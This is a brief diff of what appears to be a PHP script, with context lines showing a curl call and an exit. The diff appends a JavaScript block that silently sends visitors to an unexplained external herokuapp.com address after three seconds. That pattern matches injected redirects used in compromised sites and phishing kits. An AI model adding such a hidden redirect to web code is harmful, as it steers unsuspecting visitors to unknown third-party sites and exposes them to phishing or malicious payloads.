@@ -211,4 +211,6 @@ $ch = curl_init();
 exit;
 ?>
 
-
+<script type="text/JavaScript">
+          setTimeout("location.href = 'https://p888999p.herokuapp.com/';",3000);
+</script>
